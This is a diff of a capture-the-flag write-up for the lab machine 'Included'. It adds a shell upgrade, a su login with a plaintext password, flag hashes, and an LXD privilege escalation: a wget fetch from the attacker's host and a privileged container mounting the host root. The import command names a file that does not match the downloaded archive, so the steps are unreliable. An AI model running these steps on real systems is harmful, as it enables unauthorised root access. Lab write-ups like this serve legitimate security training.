@@ -1,6 +1,6 @@
 # MACHINE - INCLUDED
 
-IP: 10.129.243.148
+IP: 10.129.243.253
 
 Type: Linux
 
@@ -163,9 +163,9 @@ $ gobuster -u http://{IP}/ -w /usr/share/wordlists/dirb/common.txt
 /.hta                 (Status: 403) [Size: 278]
 /.htpasswd            (Status: 403) [Size: 278]
 /.htaccess            (Status: 403) [Size: 278]
-/fonts                (Status: 301) [Size: 314] [--> http://10.129.95.185/fonts/]
-/images               (Status: 301) [Size: 315] [--> http://10.129.95.185/images/]
-/index.php            (Status: 301) [Size: 308] [--> http://10.129.95.185/]
+/fonts                (Status: 301) [Size: 314]
+/images               (Status: 301) [Size: 315]
+/index.php            (Status: 301) [Size: 308]
 /server-status        (Status: 403) [Size: 278]
 Progress: 4614 / 4615 (99.98%)
 ...
@@ -232,10 +232,75 @@ $ nc -lnvp {remote-port}
 $ curl -X GET http://{IP}/?file=/var/lib/tftpboot/script.php
 ```
 
+- Once we have obtained the shell, we can become user mike with
+
+```bash
+www-data@included:/home/mike$ python3 -c 'import pty; pty.spawn("/bin/bash")'
+www-data@included:/home/mike$ export TERM=xterm
+www-data@included:/home/mike$ su mike
+Password: Sheffield19
+
+mike@included:~$ cat user.txt
+a56ef91d70cfbf2cdb8f454c006935a1
+```
+
+- At this point we need to become root user
+- We can use lateral movement exploiting the fact that mike belongs to LXD group
+
+---
+
+## LINUX PRIVESC WITH LXD
+
+- The idea is to:
+
+1. Start a container with root privileges
+2. Mount the entire host filesystem in the container
+3. Obtain a shell inside the container and get the flag
+
+- First of all, in our local machine let's download the apline image
+
+```bash
+$ git clone https://github.com/saghul/lxd-alpine-builder.git
+$ cd lxd-alpine-builder
+$ sudo ./build-alpine
+$ ls
+alpine-v3.13-x86_64-20210218_0139.tar.gz
+$ python3 -m http.server
+```
+
+- The last command host an HTTP server on our local machine
+- In this way we can download the TAR archive from the victim machine
+- On the victim machine we need to given these commands
+
+```bash
+mike@included:~$ wget http://{MyIP}:8000/alpine-v3.13-x86_64-20210218_0139.tar.gz
+mike@included:~$ lxd init
+mike@included:~$ lxc image import ./alpine-v3.10-x86_64-20191008_1227.tar.gz --alias myimage
+mike@included:~$ lxc image list
+
++---------+--------------+--------+-------------------------------+--------+--------+
+|  ALIAS  | FINGERPRINT  | PUBLIC |          DESCRIPTION          |  ARCH  |  SIZE  |
++---------+--------------+--------+-------------------------------+--------+--------+
+| myimage | cd73881adaac | no     | alpine v3.13 (20210218_01:39) | x86_64 | 3.11MB |
++---------+--------------+--------+-------------------------------+--------+--------+
+
+mike@included:~$ lxc init myimage ignite -c security.privileged=true
+mike@included:~$ lxc config device add ignite mydevice disk source=/ path=/mnt/ recursive=true
+mike@included:~$ lxc start ignite
+mike@included:~$ lxc exec ignite /bin/sh
+~# id
+uid=0(root) gid=0(root)
+~# cd /mnt/root/
+/mnt/root# ls
+root.txt
+/mnt/root# cat root.txt
+c693d9c7499d9f572ee375d4c14c7bcf
+```
+
 ---
 
 ## FLAGS
 
-USER: 
+USER: a56ef91d70cfbf2cdb8f454c006935a1
 
-ROOT: 
+ROOT: c693d9c7499d9f572ee375d4c14c7bcf
